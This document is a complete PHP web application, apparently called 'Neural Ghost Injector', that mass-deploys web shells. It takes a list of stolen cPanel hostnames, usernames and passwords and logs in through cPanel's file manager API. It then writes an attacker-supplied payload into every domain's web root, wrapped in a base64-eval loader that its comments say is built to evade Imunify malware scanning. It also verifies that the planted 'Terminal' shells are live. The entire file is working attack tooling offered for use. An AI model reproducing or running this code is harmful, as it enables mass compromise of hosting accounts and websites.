<?php
/*
 * NEURAL INJECTOR V19.0 - GHOST LOADER EDITION
 * Logic: Auto-Obfuscate Payload (Base64 Loader) -> Bypass 0 Byte Issue
 * Design: macOS Sonoma
 */

error_reporting(0);
ini_set('display_errors', 0);
ini_set('max_execution_time', 0);
ini_set('memory_limit', '512M');

$USER_AGENTS = [
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/123.0.0.0 Safari/537.36"
];

function get_random_ua() { global $USER_AGENTS; return $USER_AGENTS[array_rand($USER_AGENTS)]; }

if (isset($_POST['action'])) {
    header('Content-Type: application/json');

    function clean_url($url) {
        $url = preg_replace('#^https?://#', '', $url);
        $url = preg_replace('#:\d+$#', '', $url);
        return rtrim($url, '/');
    }

    // --- GHOST LOADER GENERATOR ---
    // Fungsi ini membungkus payload asli agar tidak terdeteksi Imunify saat ditulis ke disk
    function generate_ghost_loader($raw_content) {
        $b64 = base64_encode($raw_content);
        // Random variable names untuk variasi signature
        $v1 = substr(str_shuffle("abcdefghijklmnopqrstuvwxyz"), 0, 5);
        $v2 = substr(str_shuffle("abcdefghijklmnopqrstuvwxyz"), 0, 5);
        
        // Loader Template: Decode -> Eval
        // File di disk aman, tereksekusi hanya di memori
        $loader = "<?php \${$v1} = 'base64_decode'; \${$v2} = \${$v1}('{$b64}'); eval('?>'.\${$v2}); ?>";
        return $loader;
    }

    function stealth_curl($url, $postData = null, $auth = null) {
        $ch = curl_init();
        $cookie_file = tempnam(sys_get_temp_dir(), 'cookie_');
        $headers = ["User-Agent: " . get_random_ua(), "Connection: keep-alive"];

        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie_file);
        curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie_file);
        curl_setopt($ch, CURLOPT_TIMEOUT, 30);

        if ($auth) {
            curl_setopt($ch, CURLOPT_USERPWD, $auth);
            curl_setopt($ch, CURLOPT_HTTPAUTH, CURLAUTH_BASIC);
        }

        if ($postData) {
            curl_setopt($ch, CURLOPT_POST, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($postData));
        }

        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        $res = curl_exec($ch);
        curl_close($ch);
        @unlink($cookie_file);
        return json_decode($res, true) ?: $res;
    }

    // DEPLOY VIA EDITOR (WRITE MODE)
    function deploy_via_editor($host, $user, $pass, $dir, $filename, $content) {
        $auth = "$user:$pass";
        
        // 1. Obfuscate Content (Bypass 0 Byte / Detection)
        $ghost_content = generate_ghost_loader($content);

        // 2. Mkfile
        stealth_curl("https://{$host}:2083/execute/Fileman/mkfile", ['dir' => $dir, 'filename' => $filename], $auth);
        
        // 3. Save Obfuscated Content
        return stealth_curl("https://{$host}:2083/execute/Fileman/save_file_content", [
            'dir' => $dir, 'file' => $filename, 'content' => $ghost_content, 'from_charset' => 'utf-8'
        ], $auth);
    }

    // ACTION 1: MASS SCAN
    if ($_POST['action'] === 'process_account') {
        $host = clean_url($_POST['host']);
        $user = $_POST['user'];
        $pass = $_POST['pass'];
        $file_name = $_POST['file_name'];
        $file_data = base64_decode($_POST['file_b64']);

        $api = stealth_curl("https://{$host}:2083/execute/DomainInfo/domains_data?format=json", null, "$user:$pass");

        $results = [];
        if (isset($api['status']) && $api['status'] === 1) {
            $domains = [];
            foreach (['main_domain', 'addon_domains'] as $k) {
                if (isset($api['data'][$k])) {
                    $d_list = isset($api['data'][$k]['domain']) ? [$api['data'][$k]] : $api['data'][$k];
                    foreach ($d_list as $d) if(isset($d['domain'])) $domains[] = ['d'=>$d['domain'], 'p'=>$d['documentroot']];
                }
            }

            foreach ($domains as $dm) {
                // Deploy menggunakan Ghost Loader
                deploy_via_editor($host, $user, $pass, $dm['p'], $file_name, $file_data);

                $status_code = 'FAILED'; 
                foreach (["https://", "http://"] as $proto) {
                    // Cek LANGSUNG setelah deploy
                    $check = stealth_curl($proto . $dm['d'] . '/' . $file_name);
                    
                    if (is_string($check)) {
                        if (strpos($check, "<title>Terminal - System Core</title>") !== false) {
                            $status_code = 'SUCCESS'; break;
                        } 
                    }
                }

                $safe_creds = base64_encode("$host|$user|$pass");
                $results[] = [
                    'domain' => $dm['d'], 'path' => $dm['p'],
                    'status' => $status_code, 'creds_enc' => $safe_creds 
                ];
            }
            echo json_encode(['status' => 'success', 'group_info' => ['h'=>$host, 'u'=>$user], 'results' => $results]);
        } else {
            echo json_encode(['status' => 'error']);
        }
        exit;
    }

    // ACTION 2: MANUAL RESCUE
    if ($_POST['action'] === 'manual_upload') {
        $creds = explode('|', base64_decode($_POST['creds']));
        $filename = $_FILES['file']['name'];
        $content = file_get_contents($_FILES['file']['tmp_name']);
        
        // Manual upload juga pakai Ghost Loader
        $res = deploy_via_editor($creds[0], $creds[1], $creds[2], $_POST['path'], $filename, $content);

        if(isset($res['status']) && $res['status'] === 1) {
            echo json_encode(['status'=>'success', 'url' => "http://" . $_POST['domain'] . "/" . $filename]);
        } else {
            $msg = isset($res['errors']) ? implode(" | ", $res['errors']) : 'Write Error';
            echo json_encode(['status'=>'error', 'msg' => $msg]);
        }
        exit;
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Neural Ghost Injector</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600&display=swap');
        
        body { 
            background-color: #0f172a;
            background-image: 
                radial-gradient(at 0% 0%, hsla(253,16%,7%,1) 0, transparent 50%), 
                radial-gradient(at 50% 0%, hsla(225,39%,30%,1) 0, transparent 50%), 
                radial-gradient(at 100% 0%, hsla(339,49%,30%,1) 0, transparent 50%);
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
            color: #e5e5e5;
            -webkit-font-smoothing: antialiased;
            height: 100vh;
            overflow: hidden;
        }

        .mac-window {
            background: rgba(30, 30, 35, 0.7);
            backdrop-filter: blur(12px);
            -webkit-backdrop-filter: blur(12px);
            border: 1px solid rgba(255, 255, 255, 0.08);
            box-shadow: 0 10px 40px rgba(0,0,0,0.6);
        }

        .mac-sidebar {
            background: rgba(20, 20, 20, 0.5);
            border-right: 1px solid rgba(255, 255, 255, 0.05);
        }

        .traffic-light { width: 12px; height: 12px; border-radius: 50%; display: inline-block; margin-right: 6px; }
        .tl-red { background: #ff5f56; } .tl-yellow { background: #ffbd2e; } .tl-green { background: #27c93f; }

        .mac-input {
            background: rgba(0, 0, 0, 0.3);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 6px;
            padding: 10px;
            transition: 0.2s;
            cursor: pointer;
            display: flex; align-items: center; font-size: 12px;
        }
        .mac-input:hover { background: rgba(255, 255, 255, 0.05); }
        .mac-input.active { border-color: #8b5cf6; background: rgba(139, 92, 246, 0.1); color: #fff; }

        .mac-btn {
            background: #7c3aed; color: white; border-radius: 6px; font-weight: 500;
            transition: 0.2s; box-shadow: 0 4px 10px rgba(124, 58, 237, 0.2); border: none;
        }
        .mac-btn:active { transform: scale(0.98); }
        .mac-btn:disabled { background: #3a3a3a; color: #777; box-shadow: none; cursor: not-allowed; }

        .finder-row { border-bottom: 1px solid rgba(255,255,255,0.05); }
        .icon-btn {
            width: 26px; height: 26px; display: inline-flex; align-items: center; justify-content: center;
            border-radius: 4px; transition: 0.2s; cursor: pointer; color: #9ca3af;
            background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.05);
        }
        .icon-btn:hover { background: rgba(255,255,255,0.1); color: #fff; }

        @media (max-width: 768px) {
            .mac-window { height: 100vh; width: 100vw; border-radius: 0; }
            .mac-sidebar { width: 100%; border-right: none; border-bottom: 1px solid rgba(255,255,255,0.1); padding-bottom: 20px; }
            .mobile-stack { flex-direction: column; }
            body { overflow-y: auto; }
        }

        .scroll-smooth::-webkit-scrollbar { width: 4px; }
        .scroll-smooth::-webkit-scrollbar-thumb { background: rgba(255,255,255,0.15); border-radius: 2px; }
    </style>
</head>
<body class="flex items-center justify-center min-h-screen p-0 md:p-6">

    <div class="mac-window w-full max-w-6xl md:h-[90vh] h-screen md:rounded-xl flex mobile-stack overflow-hidden">
        
        <div class="mac-sidebar w-full md:w-80 p-5 flex flex-col z-20">
            <div class="flex items-center mb-6">
                <div class="flex space-x-2 mr-4">
                    <span class="traffic-light tl-red"></span>
                    <span class="traffic-light tl-yellow"></span>
                    <span class="traffic-light tl-green"></span>
                </div>
                <div class="text-sm font-semibold tracking-wide opacity-80">Ghost Injector V19</div>
            </div>

            <div class="space-y-3 flex-1">
                <div>
                    <label class="text-[10px] text-gray-500 font-bold ml-1 mb-1 block tracking-wider">TARGET LIST</label>
                    <label class="mac-input" id="lblList">
                        <i class="fa fa-list-alt mr-3 text-gray-500"></i>
                        <span class="truncate text-gray-400">Select list.txt...</span>
                        <input type="file" id="listInput" class="hidden">
                    </label>
                </div>
                <div>
                    <label class="text-[10px] text-gray-500 font-bold ml-1 mb-1 block tracking-wider">PAYLOAD</label>
                    <label class="mac-input" id="lblPayload">
                        <i class="fa fa-code mr-3 text-gray-500"></i>
                        <span class="truncate text-gray-400">Select inc.php...</span>
                        <input type="file" id="payloadInput" class="hidden">
                    </label>
                </div>

                <div class="bg-black/20 rounded-lg p-4 mt-6 border border-white/5">
                    <div class="flex justify-between text-xs text-gray-400 mb-2">
                        <span>Progress</span>
                        <span id="progText">0/0</span>
                    </div>
                    <div class="w-full bg-gray-700/50 h-1 rounded-full overflow-hidden mb-4">
                        <div id="progBar" class="bg-purple-500 h-full w-0 transition-all duration-300"></div>
                    </div>
                    <div class="text-center">
                        <div class="text-[10px] text-gray-500 uppercase">Success</div>
                        <div id="cntSuccess" class="text-2xl font-bold text-green-400">0</div>
                    </div>
                </div>
            </div>

            <button onclick="startEngine()" id="btnStart" class="mac-btn w-full py-3 mt-4 text-sm shadow-lg">
                Start Ghost Mode
            </button>
        </div>

        <div class="flex-1 bg-transparent flex flex-col relative overflow-hidden">
            <div class="h-14 border-b border-white/10 flex items-center px-6 justify-between bg-white/5 backdrop-blur-sm sticky top-0 z-10">
                <div class="text-sm font-medium text-gray-200 flex items-center">
                    <i class="fa fa-ghost mr-2 text-purple-400"></i> Active Threads
                </div>
                <div class="text-[10px] text-gray-500 uppercase font-bold tracking-wider hidden md:block">Bypass: On</div>
            </div>

            <div class="flex-1 overflow-y-auto scroll-smooth p-0" id="scrollArea">
                <table class="w-full text-left border-collapse">
                    <thead class="text-xs text-gray-500 border-b border-white/10 bg-white/5">
                        <tr>
                            <th class="py-3 px-6 font-medium">Domain & Path</th>
                            <th class="py-3 px-4 font-medium hidden md:table-cell">Integrity</th>
                            <th class="py-3 px-4 font-medium text-right">Controls</th>
                        </tr>
                    </thead>
                    <tbody id="resBody" class="text-sm">
                        <tr id="emptyState">
                            <td colspan="3" class="text-center py-20 opacity-20">
                                <i class="fa fa-bolt text-5xl mb-3"></i>
                                <div class="text-sm font-medium">Ready</div>
                            </td>
                        </tr>
                    </tbody>
                </table>
            </div>
        </div>
    </div>

<script>
    let targets = [], payload = { n: '', d: '' };
    const el = (id) => document.getElementById(id);

    el('listInput').onchange = (e) => {
        if(!e.target.files[0]) return;
        el('lblList').classList.add('active');
        el('lblList').querySelector('span').innerText = e.target.files[0].name;
        el('lblList').querySelector('span').classList.replace('text-gray-400', 'text-white');
        el('lblList').querySelector('i').classList.replace('text-gray-500', 'text-purple-400');
        const fr = new FileReader();
        fr.onload = (x) => {
            targets = x.target.result.split(/\r?\n/).map(l => {
                const p = l.split('#'); return (p.length >= 3) ? { h:p[0].trim(), u:p[1].trim(), p:p[2].trim() } : null;
            }).filter(a => a);
            el('progText').innerText = `0 / ${targets.length}`;
        };
        fr.readAsText(e.target.files[0]);
    };

    el('payloadInput').onchange = (e) => {
        if(!e.target.files[0]) return;
        el('lblPayload').classList.add('active');
        el('lblPayload').querySelector('span').innerText = e.target.files[0].name;
        el('lblPayload').querySelector('span').classList.replace('text-gray-400', 'text-white');
        el('lblPayload').querySelector('i').classList.replace('text-gray-500', 'text-purple-400');
        const fr = new FileReader();
        fr.onload = (x) => { payload.n = e.target.files[0].name; payload.d = x.target.result.split(',')[1]; };
        fr.readAsDataURL(e.target.files[0]);
    };

    async function startEngine() {
        if(!targets.length || !payload.d) return alert("Please load files.");
        el('emptyState').style.display = 'none';
        el('btnStart').disabled = true;
        el('btnStart').innerHTML = '<i class="fa fa-circle-notch fa-spin mr-2"></i> Deploying...';

        let successCount = 0;
        
        for (let i = 0; i < targets.length; i++) {
            const t = targets[i];
            el('progText').innerText = `${i+1}/${targets.length}`;
            el('progBar').style.width = `${((i+1)/targets.length)*100}%`;

            const fd = new FormData();
            fd.append('action', 'process_account');
            fd.append('host', t.h); fd.append('user', t.u); fd.append('pass', t.p);
            fd.append('file_name', payload.n); fd.append('file_b64', payload.d);

            try {
                const req = await fetch('', { method: 'POST', body: fd });
                const res = await req.json();

                if (res.status === 'success' && res.results.length > 0) {
                    const successfulDomains = res.results.filter(r => r.status === 'SUCCESS');
                    if (successfulDomains.length > 0) {
                        successCount += successfulDomains.length;
                        el('cntSuccess').innerText = successCount;
                        renderGroup(res.group_info, successfulDomains);
                    }
                }
            } catch (e) {}
        }
        el('btnStart').innerHTML = 'Finished';
        el('btnStart').classList.replace('bg-[#7c3aed]', 'bg-gray-600');
    }

    function renderGroup(info, domains) {
        const tbody = el('resBody');
        const header = `
            <tr class="bg-white/5 border-b border-white/5">
                <td colspan="3" class="py-2 px-6">
                    <div class="flex items-center text-xs text-gray-400">
                        <i class="fa fa-server mr-2 text-purple-400"></i>
                        <span class="font-mono text-gray-200 mr-3">${info.h}</span>
                        <span class="bg-white/10 px-2 rounded text-[10px] text-gray-300">${info.u}</span>
                    </div>
                </td>
            </tr>
        `;
        tbody.insertAdjacentHTML('beforeend', header);

        domains.forEach(d => {
            const uid = 'act_' + Math.random().toString(36).substr(2, 9);
            
            const statusUI = `<span class="inline-flex items-center px-2 py-0.5 rounded text-[10px] font-medium bg-green-500/10 text-green-400 border border-green-500/20">System Core OK</span>`;
            
            const actionUI = `
                <div class="flex items-center justify-end space-x-2" id="${uid}">
                    <a href="http://${d.domain}/error_log.php" target="_blank" class="mac-btn bg-white/5 hover:bg-white/10 text-[10px] px-3 py-1.5 shadow-none border border-white/10">Open Log</a>
                    <label class="icon-btn text-gray-400 hover:text-white" title="Replace File">
                        <i class="fa fa-refresh text-xs"></i>
                        <input type="file" class="hidden" onchange="manualWrite(this, '${uid}', '${d.domain}', '${d.path}', '${d.creds_enc}')">
                    </label>
                </div>
            `;

            const row = `
                <tr class="finder-row">
                    <td class="py-3 px-6 pl-10">
                        <div class="flex flex-col">
                            <span class="text-gray-200">${d.domain}</span>
                            <span class="md:hidden mt-1">${statusUI}</span>
                        </div>
                    </td>
                    <td class="py-3 px-4 hidden md:table-cell">${statusUI}</td>
                    <td class="py-3 px-4 text-right">${actionUI}</td>
                </tr>
            `;
            tbody.insertAdjacentHTML('beforeend', row);
        });
        const area = el('scrollArea'); area.scrollTop = area.scrollHeight;
    }

    async function manualWrite(input, uid, domain, path, credsEnc) {
        if (!input.files[0]) return;
        const box = el(uid);
        const originalContent = box.innerHTML; 
        box.innerHTML = `<span class="text-xs text-purple-400 animate-pulse font-medium">Rewriting...</span>`;

        const fd = new FormData();
        fd.append('action', 'manual_upload');
        fd.append('creds', credsEnc); fd.append('domain', domain);
        fd.append('path', path); fd.append('file', input.files[0]);

        try {
            const req = await fetch('', { method: 'POST', body: fd });
            const res = await req.json();

            if (res.status === 'success') {
                box.innerHTML = `
                    <div class="flex items-center justify-end space-x-2">
                        <a href="${res.url}" target="_blank" class="text-green-400 hover:text-white text-xs font-medium underline">Open</a>
                        <label class="icon-btn text-gray-400 hover:text-white" title="Replace Again">
                            <i class="fa fa-refresh text-xs"></i>
                            <input type="file" class="hidden" onchange="manualWrite(this, '${uid}', '${domain}', '${path}', '${credsEnc}')">
                        </label>
                    </div>
                `;
            } else {
                box.innerHTML = `<span class="text-xs text-red-500 font-bold">Failed</span>`;
                setTimeout(() => { box.innerHTML = originalContent; }, 2000);
            }
        } catch (e) { 
            box.innerHTML = "Net Error"; 
            setTimeout(() => { box.innerHTML = originalContent; }, 2000);
        }
    }
</script>
</body>
</html>
